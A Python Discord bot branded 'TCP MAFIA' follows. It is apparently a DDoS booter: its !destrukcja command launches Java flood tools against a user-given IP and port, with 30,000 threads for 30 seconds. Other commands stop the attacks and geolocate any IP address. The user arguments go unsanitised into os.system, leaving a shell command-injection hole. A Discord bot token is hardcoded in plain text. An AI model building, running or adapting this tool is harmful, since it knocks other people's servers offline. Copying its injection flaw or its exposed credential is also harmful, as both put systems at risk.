import discord
from discord.ext import commands
import os
import threading
import requests
import urllib.request
import json
import asyncio
import sqlite3
from discord import Member

token = "MTE1MzcyNTM3NDkyMDkyNTE4NA.GOUlFf.Ms6Cd0UjbKU-EZUm4vx9FBfNjWaH4AlRagWZ8Y"

client = commands.Bot(command_prefix = '!', intents= discord.Intents.all())
client.remove_command('help')



@client.event
async def on_ready():
    await client.change_presence(status=discord.Status.idle, activity=discord.Game(name='ᴛᴄᴘ ᴍᴀғɪᴀ - ᴄᴏʀᴇ'))
    print("TCPMAFIA - CORE has been loaded successfully")

@client.command()
@commands.has_permissions(manage_messages=True)
async def stop(ctx):
    os.system("pkill 'java'")
    embed = discord.Embed(
        title='Attack stopped!',
        description=f'All attacks successfully stopped!',
        color=discord.Colour.orange()
    )

    await ctx.send(embed=embed)

@client.command()
async def destrukcja(ctx, arg1, arg2, arg3):
    def attack():
        os.system(
            f"java -jar m.jar {arg1}:{arg2} {arg3} join 30 -1")
        os.system(
            f"java -jar a.jar host-{arg1} port-{arg2} threads-30000 time-30")

    embed = discord.Embed(
        title='✅ATTACK SENT!',
        color=discord.Colour.orange()
    )

    embed.add_field(name=':man_detective: SERVER:', value=f'{arg1}:{arg2}', inline=False)
    embed.add_field(name=':stopwatch: TIME:', value=f'30 sekund', inline=False)
    embed.set_thumbnail(
        url='https://media.discordapp.net/attachments/964800182980059149/987727980367319110/9296f70fce1ae3f298e0d085c17f6a3f.gif')
    embed.set_image(url=f'https://media.discordapp.net/attachments/1061412466615128184/1106636413853782036/tcpmafia_gif.gif')
    embed.set_footer(text="𝗧𝗖𝗣 𝗠𝗔𝗙𝗜𝗔 | 𝗕𝗬 𝗺𝘅𝗸$𝗶𝗼#𝟱𝟭𝟰𝟱")

    t1 = threading.Thread(target=attack)

    t1.start()
    await ctx.send(embed=embed)

@client.command()
async def help(ctx):
    embed = discord.Embed(
        title="Commands / Methods",
        color=discord.Colour.red()
    )
    embed.add_field(name='Destrukcja', value='!destrukcja <ip>:<port> <protocol>', inline=False)
    embed.add_field(name='Ip info', value='!info <ip>', inline=False)
    embed.add_field(name='stop', value='!stop (Stopping all attacks)', inline=False)
    embed.set_thumbnail(
        url='https://media.discordapp.net/attachments/936994938133020672/1110474759705210942/236659db09c030692f7902ad4c0cd1aa.jpg?width=535&height=683')
    embed.set_image(url=f'https://media.discordapp.net/attachments/1061412466615128184/1106636413853782036/tcpmafia_gif.gif')
    embed.set_footer(text="𝗧𝗖𝗣 𝗠𝗔𝗙𝗜𝗔 | 𝗕𝗬 𝗺𝘅𝗸$𝗶𝗼#𝟱𝟭𝟰𝟱")
    await ctx.send(embed=embed)

@client.command()
async def info(ctx, arg1):
    url = "http://ipwhois.app/json/" + arg1
    file = urllib.request.urlopen(url)

    for line in file:
        decoded_line = line.decode("utf-8")

    json_object = json.loads(decoded_line)

    embed = discord.Embed(
        title="IP Resolver",
        color=discord.Colour.green() , timestamp= ctx.message.created_at
    )
    embed.add_field(name="Ip:", value=json_object["ip"], inline=False)
    embed.add_field(name="Type:", value=json_object["type"], inline=False)
    embed.add_field(name='Continent:', value=json_object["continent"], inline=False)
    embed.add_field(name="Region:", value=json_object["region"], inline=False)
    embed.add_field(name="Country:", value=json_object["country"], inline=False)
    embed.add_field(name="City:", value=json_object["city"], inline=False)
    embed.add_field(name="Latitude:", value=json_object["latitude"], inline=False)
    embed.add_field(name="Longitude:", value=json_object["longitude"], inline=False)
    embed.add_field(name="Timezone:", value=json_object["timezone_gmt"], inline=False)
    embed.add_field(name="ISP:", value=json_object["isp"], inline=False)
    embed.add_field(name="Org:", value=json_object["org"], inline=False)
    embed.add_field(name="ASN:", value=json_object["asn"], inline=False)
    embed.set_footer(text="𝗧𝗖𝗣 𝗠𝗔𝗙𝗜𝗔 | 𝗕𝗬 𝗺𝘅𝗸$𝗶𝗼#𝟱𝟭𝟰𝟱")
    embed.set_image(url=f'https://media.discordapp.net/attachments/1061412466615128184/1106636413853782036/tcpmafia_gif.gif')
    await ctx.send(embed=embed)


client.run(token)
